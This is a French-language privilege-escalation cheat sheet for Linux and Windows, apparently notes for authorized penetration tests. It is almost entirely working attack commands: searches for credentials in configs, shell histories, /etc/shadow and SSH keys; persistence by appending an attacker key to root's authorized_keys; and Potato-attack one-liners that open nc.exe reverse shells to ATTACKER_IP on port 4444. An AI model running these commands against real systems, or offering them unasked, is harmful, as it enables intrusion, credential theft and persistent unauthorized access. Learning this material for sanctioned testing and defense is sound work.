# Privilege Escalation

---

## Linux

### Enumération rapide

```bash
# Identité
id && whoami && hostname
uname -a
cat /etc/os-release

# Scripts automatisés
./linpeas.sh
./linux-exploit-suggester.sh
```

### Kernel Exploits

```bash
# Identifier la version du kernel
uname -r
cat /etc/os-release

# Chercher des exploits pour cette version
searchsploit linux kernel <version>
# Exemple : kernel 3.9.0-73 -> CVE-2016-5195 (DirtyCow)

# linux-exploit-suggester
./linux-exploit-suggester.sh
```

Attention : les kernel exploits peuvent rendre le système instable. A utiliser en dernier recours et avec accord du client.

### Software vulnérable

```bash
# Lister les packages installés
dpkg -l                               # Debian/Ubuntu
rpm -qa                               # RHEL/CentOS

# Chercher des exploits
searchsploit <application> <version>
```

### sudo

```bash
# Lister les privilèges sudo
sudo -l

# Exécuter en tant qu'un autre user
sudo -u user /bin/command

# Passer root (si sudo su autorisé)
sudo su -

# Passer à un autre user
sudo su user -

# GTFOBins : toujours vérifier les binaires listés par sudo -l
# https://gtfobins.github.io/
```

### SUID / SGID

```bash
# Trouver les binaires SUID
find / -perm -4000 -type f 2>/dev/null

# Trouver les binaires SGID
find / -perm -2000 -type f 2>/dev/null

# Vérifier sur GTFOBins si exploitable
```

### Cron jobs

```bash
# Voir les cron jobs
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# Surveiller les processus (sans root)
# Utiliser pspy : https://github.com/DominicBreuker/pspy
./pspy64
```

### Capabilities

```bash
getcap -r / 2>/dev/null
```

### Fichiers intéressants & credentials exposés

```bash
# Mots de passe dans les configs
cat /etc/shadow          # si lisible
find / -name "*.bak" -o -name "*.old" -o -name "*.conf" 2>/dev/null
grep -ri "password" /etc/ 2>/dev/null
grep -ri "password" /home/ 2>/dev/null
grep -ri "password" /var/www/ 2>/dev/null

# Fichiers de config courants
cat /var/www/html/config.php
cat /var/www/html/wp-config.php
cat /etc/mysql/my.cnf

# Historique (credentials en clair)
cat ~/.bash_history
cat ~/.mysql_history
# Windows : PSReadLine
cat C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Clés SSH
find / -name id_rsa 2>/dev/null
find / -name authorized_keys 2>/dev/null

# Toujours tester le PASSWORD REUSE entre services/users
```

### SSH key persistence

```bash
# Générer une paire de clés
ssh-keygen -f key

# Ajouter la clé publique sur la cible
echo "ssh-rsa AAAAB...SNIP...= user@attacker" >> /root/.ssh/authorized_keys

# Se connecter avec la clé privée
ssh root@TARGET_IP -i key
```

---

## Windows

### Software vulnérable (Windows)

```cmd
:: Lister les programmes installés
dir "C:\Program Files"
dir "C:\Program Files (x86)"
wmic product get name,version
```

### Enumération rapide

```cmd
whoami /all
systeminfo
ipconfig /all
net user
net localgroup administrators

:: Scripts automatisés
.\winPEASx64.exe
.\Seatbelt.exe -group=all
powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"
```

### Tokens & Privileges

```cmd
:: Vérifier les privilèges
whoami /priv

:: SeImpersonatePrivilege -> Potato attacks
.\JuicyPotato.exe -l 1337 -p C:\Windows\Temp\nc.exe -a "ATTACKER_IP 4444 -e cmd.exe" -t *
.\PrintSpoofer64.exe -c "C:\Windows\Temp\nc.exe ATTACKER_IP 4444 -e cmd.exe"
.\GodPotato.exe -cmd "C:\Windows\Temp\nc.exe ATTACKER_IP 4444 -e cmd.exe"
```

### Services

```cmd
:: Lister les services
sc query state= all
wmic service get name,pathname,startmode

:: Chercher des unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows"
```

### Registry

```cmd
:: AutoRun
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

:: Credentials stockées
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
cmdkey /list
```

### Scheduled Tasks

```cmd
schtasks /query /fo LIST /v
```
